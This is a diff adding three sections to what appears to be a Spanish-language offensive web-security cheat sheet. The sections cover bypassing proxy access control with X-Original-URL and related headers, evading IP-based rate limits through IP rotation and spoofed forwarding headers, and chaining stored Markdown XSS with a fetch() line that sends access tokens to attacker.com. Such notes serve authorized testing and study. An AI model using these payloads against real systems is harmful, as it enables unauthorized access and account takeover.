@@ -131,3 +131,52 @@ katana -u live_hosts.txt -d 3 -jc -o endpoints.txt
 # 3. Escaneo rápido de vulnerabilidades conocidas con Nuclei
 nuclei -l live_hosts.txt -severity critical,high -t cves/ -o findings.txt
 ```
+
+
+
+---
+
+## 🎯 8. Bypass de Control de Acceso mediante Cabeceras de Sobreescritura (URL Overrides)
+
+### Contexto y Mecanismo
+En arquitecturas donde un reverse proxy (Nginx, HAProxy, Cloudflare) interactúa con un servidor backend (Spring, Express, Django), el backend puede admitir cabeceras de reescritura que omiten las reglas de autorización del proxy:
+
+```http
+GET /unprotected/path HTTP/1.1
+Host: target.com
+X-Original-URL: /admin/dashboard
+X-Rewrite-URL: /admin/dashboard
+X-Forwarded-Server: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+```
+
+### Punto de Vista Táctico
+El proxy valida la ruta `/unprotected/path` y permite el paso; el backend lee `X-Original-URL`, enruta internamente hacia `/admin/dashboard` y ejecuta la lógica protegida sin pasar por el middleware de autenticación del proxy.
+
+---
+
+## 🎯 9. Evasión de Rate Limiting mediante Rotación Dinámica de IPs
+
+### Técnica de Evasión
+Cuando los límites de tasa están vinculados únicamente a la dirección IP de origen (`REMOTE_ADDR`) y no a la sesión, identificador de usuario o huella digital TLS:
+- Emplear herramientas de rotación de salida (e.g. `mubeng`, proxies residenciales o servicios de rotación vía AWS API Gateway).
+- Verificar si cabeceras de proxy spoofing son confiadas por el backend:
+  ```http
+  X-Forwarded-For: 127.0.0.1
+  X-Forwarded-For: 1.1.1.1, 2.2.2.2
+  X-Client-IP: 10.0.0.1
+  X-Real-IP: 192.168.1.1
+  Client-IP: 127.0.0.1
+  ```
+
+---
+
+## 🎯 10. Encadenamiento Táctico: XSS Almacenado en Parsers Markdown -> Robo de Tokens
+
+### Escenario Real
+1. Inyectar payloads políglotas en parsers híbridos de Markdown que procesan etiquetas HTML mixtas o enlaces de esquemas `javascript:` o `data:`.
+2. Una vez ejecutado JavaScript en el contexto de la víctima, evitar alertas genéricas y exfiltrar directamente secretos de sesión almacenados inseguramente en el cliente:
+   ```javascript
+   fetch('https://attacker.com/log?token=' + encodeURIComponent(localStorage.getItem('access_token') || sessionStorage.getItem('jwt')));
+   ```
+3. El impacto pasa de un XSS de severidad media a un **Account Takeover (ATO) de severidad Alta/Crítica**.
